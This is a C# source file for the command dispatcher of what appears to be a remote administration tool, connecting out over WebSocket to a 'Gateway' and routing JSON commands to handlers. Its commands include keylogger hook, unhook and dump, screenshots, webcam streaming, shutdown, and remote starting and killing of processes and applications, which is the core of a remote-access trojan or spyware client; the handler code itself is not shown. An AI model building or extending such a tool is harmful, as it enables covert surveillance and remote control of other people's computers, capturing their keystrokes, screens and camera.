using System;
using System.Collections.Generic;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using server.api;

namespace server
{
    /// <summary>
    /// Refactored server implementation using WebSocket protocol with JSON messages.
    /// Acts as a centralized router/dispatcher for WebSocket endpoints.
    /// Based on the Loop-Free Architecture specification in COMMAND_MAPPING.md
    /// </summary>
    public class ServerRefactor
    {
        // WebSocket connection
        private ClientWebSocket webSocket;
        private CancellationTokenSource cancellationTokenSource;

        // Handler instances for different endpoint categories
        private readonly KeyloggerHandler keyloggerHandler;
        private readonly SystemHandler systemHandler;
        private readonly ScreenshotHandler screenshotHandler;
        private readonly ProcessHandler processHandler;
        private readonly ApplicationHandler applicationHandler;
        private readonly WebcamHandler webcamHandler;

        public ServerRefactor()
        {
            // Initialize all handlers
            keyloggerHandler = new KeyloggerHandler();
            systemHandler = new SystemHandler();
            screenshotHandler = new ScreenshotHandler();
            processHandler = new ProcessHandler();
            applicationHandler = new ApplicationHandler();
            webcamHandler = new WebcamHandler();
            
            // Set up webcam handler callback for sending frames
            // This will be set when WebSocket is available in StartListeningAsync
        }

        /// <summary>
        /// Main message handler - dispatches incoming WebSocket messages to appropriate command handlers
        /// </summary>
        public async Task HandleMessageAsync(ClientWebSocket ws, string messageJson)
        {
            this.webSocket = ws;
            
            try
            {
                // Parse incoming JSON message
                var message = JsonDocument.Parse(messageJson);
                var root = message.RootElement;

                if (!root.TryGetProperty("command", out JsonElement commandElement))
                {
                    await SendErrorResponseAsync("Missing 'command' field");
                    return;
                }

                string command = commandElement.GetString();
                if (string.IsNullOrEmpty(command))
                {
                    await SendErrorResponseAsync("Command field is null or empty");
                    return;
                }

                object response = null;

                // Dispatch to appropriate handler based on command
                // Wrap each handler call in try-catch to prevent one bad handler from crashing everything
                try
                {
                    switch (command)
                    {
                        // Keylogger commands
                        case "KEYLOG_HOOK":
                            response = await keyloggerHandler.HookAsync();
                            break;
                        case "KEYLOG_UNHOOK":
                            response = await keyloggerHandler.UnhookAsync();
                            break;
                        case "KEYLOG_PRINT":
                            response = await keyloggerHandler.PrintAsync();
                            break;

                        // System commands
                        case "SHUTDOWN":
                            response = await systemHandler.ShutdownAsync();
                            break;
                        case "RESTART":
                            response = await systemHandler.RestartAsync();
                            break;

                        // Screenshot commands
                        case "TAKEPIC":
                            response = await screenshotHandler.TakePictureAsync();
                            break;

                        // Process management commands
                        case "PROCESS_LIST":
                            response = await processHandler.GetProcessListAsync();
                            break;
                        case "PROCESS_KILL":
                            response = await processHandler.KillProcessAsync(root);
                            break;
                        case "PROCESS_START":
                            response = await processHandler.StartProcessAsync(root);
                            break;

                        // Application management commands
                        case "APPLICATION_LIST":
                            response = await applicationHandler.GetApplicationListAsync();
                            break;
                        case "APPLICATION_KILL":
                            response = await applicationHandler.KillApplicationAsync(root);
                            break;
                        case "APPLICATION_START":
                            response = await applicationHandler.StartApplicationAsync(root);
                            break;

                        // Webcam streaming commands
                        case "WEBCAM_START":
                            response = await webcamHandler.StartWebcamAsync(root);
                            break;
                        case "WEBCAM_STOP":
                            response = await webcamHandler.StopWebcamAsync();
                            break;

                        default:
                            await SendErrorResponseAsync($"Unknown command: {command}");
                            return;
                    }
                }
                catch (Exception handlerEx)
                {
                    // Catch exceptions from individual handlers
                    Console.WriteLine($"[ERROR] Handler exception for command '{command}': {handlerEx.Message}");
                    await SendErrorResponseAsync($"Handler error for command '{command}': {handlerEx.Message}");
                    return;
                }

                // Send the response from the handler
                if (response != null)
                {
                    await SendJsonResponseAsync(response);
                }
            }
            catch (JsonException ex)
            {
                await SendErrorResponseAsync($"Invalid JSON: {ex.Message}");
            }
            catch (Exception ex)
            {
                await SendErrorResponseAsync($"Error processing command: {ex.Message}");
            }
        }

        #region Helper Methods

        /// <summary>
        /// Sends a JSON response over the WebSocket connection
        /// </summary>
        private async Task SendJsonResponseAsync(object response)
        {
            if (webSocket == null || webSocket.State != WebSocketState.Open)
            {
                Console.WriteLine("[WARNING] Cannot send message - WebSocket is not open (State: " + 
                    (webSocket?.State.ToString() ?? "null") + ")");
                return;
            }

            try
            {
                string json = JsonSerializer.Serialize(response);
                byte[] buffer = Encoding.UTF8.GetBytes(json);

                await webSocket.SendAsync(
                    new ArraySegment<byte>(buffer),
                    WebSocketMessageType.Text,
                    true,
                    cancellationTokenSource?.Token ?? CancellationToken.None
                );
            }
            catch (WebSocketException ex)
            {
                Console.WriteLine($"[ERROR] WebSocket error while sending message: {ex.Message} (State: {webSocket?.State})");
            }
            catch (InvalidOperationException ex)
            {
                Console.WriteLine($"[ERROR] Invalid operation while sending message: {ex.Message} (State: {webSocket?.State})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Unexpected error sending WebSocket message: {ex.Message}");
            }
        }

        /// <summary>
        /// Sends an error response over the WebSocket connection
        /// </summary>
        private async Task SendErrorResponseAsync(string errorMessage)
        {
            var response = new
            {
                success = false,
                message = errorMessage
            };

            await SendJsonResponseAsync(response);
        }

        /// <summary>
        /// Main WebSocket listener loop
        /// </summary>
        public async Task StartListeningAsync(ClientWebSocket ws)
        {
            this.webSocket = ws;
            this.cancellationTokenSource = new CancellationTokenSource();
            
            // Set up webcam handler callback to send frames via WebSocket
            webcamHandler.SetSendCallback(async (obj) => await SendJsonResponseAsync(obj));

            // Start keepalive ping task
            var keepaliveTask = Task.Run(async () => await KeepaliveLoopAsync(cancellationTokenSource.Token));

            byte[] buffer = new byte[1024 * 4]; // 4KB buffer

            try
            {
                while (webSocket.State == WebSocketState.Open && !cancellationTokenSource.Token.IsCancellationRequested)
                {
                    try
                    {
                        // Accumulate message fragments until we have a complete message
                        var messageBuilder = new System.Collections.Generic.List<byte>();
                        WebSocketReceiveResult result;
                        bool receivedClose = false;

                        do
                        {
                            result = await webSocket.ReceiveAsync(
                                new ArraySegment<byte>(buffer),
                                cancellationTokenSource.Token
                            );

                            if (result.MessageType == WebSocketMessageType.Close)
                            {
                                Console.WriteLine("[INFO] Received close message from Gateway");
                                await webSocket.CloseAsync(
                                    WebSocketCloseStatus.NormalClosure,
                                    "Closing",
                                    cancellationTokenSource.Token
                                );
                                receivedClose = true;
                                break;
                            }
                            else if (result.MessageType == WebSocketMessageType.Text)
                            {
                                // Accumulate the message fragment
                                messageBuilder.AddRange(new ArraySegment<byte>(buffer, 0, result.Count));
                            }
                            else if (result.MessageType == WebSocketMessageType.Binary)
                            {
                                Console.WriteLine("[WARNING] Received binary message, ignoring");
                                continue;
                            }
                        } while (!result.EndOfMessage && webSocket.State == WebSocketState.Open && !receivedClose);

                        // If we received a close message, break out of the main loop
                        if (receivedClose)
                        {
                            break;
                        }

                        // If we have a complete message, process it
                        if (messageBuilder.Count > 0 && result.MessageType == WebSocketMessageType.Text)
                        {
                            string message = Encoding.UTF8.GetString(messageBuilder.ToArray()).Trim();
                            
                            // Handle ping/pong keepalive messages BEFORE trying to parse as JSON
                            if (message == "ping" || message == "pong")
                            {
                                // Ignore ping/pong messages - they're just keepalive
                                // Gateway handles ping by sending pong, and we ignore pong responses
                                continue;
                            }
                            
                            // Handle message in a separate try-catch to prevent one bad message from killing the listener
                            try
                            {
                                await HandleMessageAsync(webSocket, message);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[ERROR] Error handling message: {ex.Message}");
                                Console.WriteLine($"[ERROR] Stack trace: {ex.StackTrace}");
                                // Continue listening even if one message fails
                            }
                        }
                    }
                    catch (OperationCanceledException)
                    {
                        // Cancellation was requested, exit gracefully
                        Console.WriteLine("[INFO] WebSocket listener cancelled");
                        break;
                    }
                    catch (WebSocketException ex)
                    {
                        // WebSocket-specific errors (connection closed, etc.)
                        Console.WriteLine($"[ERROR] WebSocket error in receive loop: {ex.Message} (State: {webSocket?.State})");
                        // Check if connection is still usable
                        if (webSocket == null || webSocket.State != WebSocketState.Open)
                        {
                            break; // Exit loop if connection is no longer open
                        }
                        // If connection is still open, continue trying to receive
                        await Task.Delay(100); // Small delay before retrying
                    }
                    catch (ObjectDisposedException)
                    {
                        Console.WriteLine("[INFO] WebSocket was disposed, exiting listener");
                        break;
                    }
                    catch (InvalidOperationException ex)
                    {
                        Console.WriteLine($"[ERROR] Invalid operation in WebSocket receive: {ex.Message} (State: {webSocket?.State})");
                        if (webSocket == null || webSocket.State != WebSocketState.Open)
                        {
                            break;
                        }
                    }
                }
            }
            catch (OperationCanceledException)
            {
                Console.WriteLine("[INFO] WebSocket listener operation cancelled");
            }
            catch (WebSocketException ex)
            {
                Console.WriteLine($"[ERROR] WebSocket connection error: {ex.Message} (State: {webSocket?.State})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Unexpected error in WebSocket listener: {ex.Message}");
                Console.WriteLine($"[ERROR] Stack trace: {ex.StackTrace}");
            }
            finally
            {
                Console.WriteLine("[INFO] WebSocket listener stopped, cleaning up...");
                // Cancel keepalive
                cancellationTokenSource?.Cancel();
                // Cleanup
                Dispose();
            }
        }

        /// <summary>
        /// Keepalive loop - sends ping messages every 30 seconds to keep connection alive
        /// </summary>
        private async Task KeepaliveLoopAsync(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested && 
                   webSocket != null && 
                   webSocket.State == WebSocketState.Open)
            {
                try
                {
                    await Task.Delay(30000, cancellationToken); // Wait 30 seconds
                    
                    if (webSocket != null && webSocket.State == WebSocketState.Open)
                    {
                        // Send ping frame
                        await webSocket.SendAsync(
                            new ArraySegment<byte>(Encoding.UTF8.GetBytes("ping")),
                            WebSocketMessageType.Text,
                            true,
                            cancellationToken
                        );
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[WARNING] Keepalive ping failed: {ex.Message}");
                    // If ping fails, connection is likely dead, break to allow reconnection
                    break;
                }
            }
        }

        /// <summary>
        /// Stop all operations and cleanup resources
        /// </summary>
        public void Dispose()
        {
            cancellationTokenSource?.Cancel();
            webcamHandler?.Stop();
            keyloggerHandler?.Stop();
        }

        #endregion
    }
}


